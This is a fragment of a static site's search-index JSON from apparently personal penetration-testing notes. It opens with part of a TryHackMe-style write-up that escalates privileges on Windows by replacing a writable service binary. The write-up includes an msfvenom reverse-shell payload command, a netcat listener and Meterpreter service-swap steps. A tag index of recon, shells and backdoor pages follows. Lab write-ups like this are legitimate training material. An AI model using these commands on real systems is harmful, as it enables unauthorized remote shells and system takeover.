IdentityReference = BUILTIN \\U sers ; Permissions = WriteData/AddFile } StartName : LocalSystem AbuseFunction : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath> CanRestart : True Name : AdvancedSystemCareService9 Check : Unquoted Service Paths I then backgrounded the session with Ctrl + Z Meaning we can stop the AdvancedSystemCareService9 service, replace C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\ASCService.exe with a malicious binary and restart the service to elevate to system. Generated replacement with msfvenom -p windows/shell_reverse_tcp LHOST = 10 .4.32.196 LPORT = 4443 -e x86/shikata_ga_nai -f exe -o Advanced.exe Start a netcat listener nc -vlp 4443 In meterpreter stop the service, replace the binary and restart it load extapi service_control stop advancedsystemcareservice9 cd C:/Program\\ Files\\ (x86)/IObit/Advanced\\ SystemCare/ cp ASCService.exe ASCService.exe.bak upload Advanced.exe ASCService.exe service_control start advancedsystemcareservice9 We then get a lovely message in our nc terminal connect to [10.4.32.196] from (UNKNOWN) [10.10.141.129] 49258 Microsoft Windows [Version 6.3.9600] ( c ) 2013 Microsoft Corporation. All rights reserved. C : \\Windows\\system32 > From the shell, get the admin flag with: type C:\\Users\\Administrator\\Desktop","title":"Escalation"},{"location":"tags.html","text":"Contents grouped by tag \u00b6 aliases \u00b6 Aliases bash \u00b6 Bash cheatsheet \u00b6 Active Recon Aliases Bash Enumeration Google Dorks Mkdocs NFS (Network File System) Nmap Cheatsheet Passive Recon Password Attacks Priv Esc RPC (Remote Procedure Call) Rustscan SMB Cheatsheet Socat SUID/SGID TCPDump Linux Terminal Tricks Windows Permissions ctf \u00b6 PwdGuessr 1 PwdGuessr 2 dns \u00b6 Active Recon enumeration \u00b6 Enumeration Nmap Cheatsheet Priv Esc Rustscan jenkins \u00b6 Alfred WriteUp linux \u00b6 Aliases Bash NFS (Network File System) Shells Socat SUID/SGID SystemD Backdoor Unit TCPDump Linux Terminal Tricks Skynet WriteUp markdown \u00b6 Mkdocs metasploit \u00b6 Alfred WriteUp netcat \u00b6 Shells nfs \u00b6 NFS (Network File System) nishang \u00b6 Alfred WriteUp passwordattack \u00b6 Password Attacks HackPark WriteUp polished \u00b6 Mkdocs PwdGuessr 1 PwdGuessr 2 Steel Mountain WriteUp powershell \u00b6 Powershell Alfred WriteUp privesc \u00b6 Priv Esc SUID/SGID Windows Permissions python \u00b6 PwdGuessr 1 PwdGuessr 2 recon \u00b6 Active Recon Enumeration Google Dorks NFS (Network File System) Nmap Cheatsheet Passive Recon RPC (Remote Procedure Call) Rustscan SMB Cheatsheet rpc \u00b6 RPC (Remote Procedure Call) setuid \u00b6 SUID/SGID shell \u00b6 Powershell Shells SystemD Backdoor Unit smb \u00b6 Active Recon SMB Cheatsheet snippet \u00b6 Active Recon Aliases Bash Enumeration Google Dorks NFS (Network File System) Nmap Cheatsheet Passive Recon Password Attacks Powershell Priv Esc RPC (Remote Procedure Call) Rustscan Shells SMB Cheatsheet Socat SystemD Backdoor Unit TCPDump Linux Terminal Tricks Windows Permissions tool \u00b6 Nmap Cheatsheet Powershell Rustscan tryhackme \u00b6 SystemD Backdoor Unit Alfred WriteUp HackPark WriteUp Skynet WriteUp Steel Mountain WriteUp windows \u00b6 Powershell Shells SMB Cheatsheet Windows Permissions Alfred WriteUp HackPark WriteUp Steel Mountain WriteUp writeups \u00b6 PwdGuessr 1 PwdGuessr 2 Alfred WriteUp HackPark WriteUp Skynet WriteUp Steel Mountain WriteUp","title":"Tags"},{"location":"tags.html#contents-grouped-by-tag","text":"","title":"Contents grouped by tag"},{"location":"tags.html#aliases","text":"Aliases","title":"aliases"},{"location":"tags.html#bash","text":"Bash","title":"bash"},{"location":"tags.html#cheatsheet","text":"Active Recon Aliases Bash Enumeration Google Dorks Mkdocs NFS (Network File System) Nmap Cheatsheet Passive Recon Password Attacks Priv Esc RPC (Remote Procedure Call) Rustscan SMB Cheatsheet Socat SUID/SGID TCPDump Linux Terminal Tricks Windows Permissions","title":"cheatsheet"},{"location":"tags.html#ctf","text":"PwdGuessr 1 PwdGuessr 2","title":"ctf"},{"location":"tags.html#dns","text":"Active Recon","title":"dns"},{"location":"tags.html#enumeration","text":"Enumeration Nmap Cheatsheet Priv Esc Rustscan","title":"enumeration"},{"location":"tags.html#jenkins","text":"Alfred WriteUp","title":"jenkins"},{"location":"tags.html#linux","text":"Aliases Bash NFS (Network File System) Shells Socat SUID/SGID SystemD Backdoor Unit TCPDump Linux Terminal Tricks Skynet WriteUp","title":"linux"},{"location":"tags.html#markdown","text":"Mkdocs","title":"markdown"},{"location":"tags.html#metasploit","text":"Alfred WriteUp","title":"metasploit"},{"location":"tags.html#netcat","text":"Shells","title":"netcat"},{"location":"tags.html#nfs","text":"NFS (Network File System)","title":"nfs"},{"location":"tags.html#nishang","text":"Alfred WriteUp","title":"nishang"},{"location":"tags.html#passwordattack","text":"Password Attacks HackPark WriteUp","title":"passwordattack"},{"location":"tags.html#polished","text":"Mkdocs PwdGuessr 1 PwdGuessr 2 Steel Mountain WriteUp","title":"polished"},{"location":"tags.html#powershell","text":"Powershell Alfred WriteUp","title":"powershell"},{"location":"tags.html#privesc","text":"Priv Esc SUID/SGID Windows Permissions","title":"privesc"},{"location":"tags.html#python","text":"PwdGuessr 1 PwdGuessr 2","title":"python"},{"location":"tags.html#recon","text":"Active Recon Enumeration Google Dorks NFS (Network File System) Nmap Cheatsheet Passive Recon RPC (Remote Procedure Call) Rustscan SMB Cheatsheet","title":"recon"},{"location":"tags.html#rpc","text":"RPC (Remote Procedure Call)","title":"rpc"},{"location":"tags.html#setuid","text":"SUID/SGID","title":"setuid"},{"location":"tags.html#shell","text":"Powershell Shells SystemD Backdoor Unit","title":"shell"},{"location":"tags.html#smb","text":"Active Recon SMB Cheatsheet","title":"smb"},{"location":"tags.html#snippet","text":"Active Recon Aliases Bash Enumeration Google Dorks NFS (Network File System) Nmap Cheatsheet Passive Recon Password Attacks Powershell Priv Esc RPC (Remote Procedure Call) Rustscan Shells SMB Cheatsheet Socat SystemD Backdoor Unit TCPDump Linux Terminal Tricks Windows Permissions","title":"snippet"},{"location":"tags.html#tool","text":"Nmap Cheatsheet Powershell Rustscan","title":"tool"},{"location":"tags.html#tryhackme","text":"SystemD Backdoor Unit Alfred WriteUp HackPark WriteUp Skynet WriteUp Steel Mountain WriteUp","title":"tryhackme"},{"location":"tags.html#windows","text":"Powershell Shells SMB Cheatsheet Windows Permissions Alfred WriteUp HackPark WriteUp Steel Mountain WriteUp","title":"windows"},{"location":"tags.html#writeups","text":"PwdGuessr 1 PwdGuessr 2 Alfred WriteUp HackPark WriteUp Skynet WriteUp Steel Mountain WriteUp","title":"writeups"}]}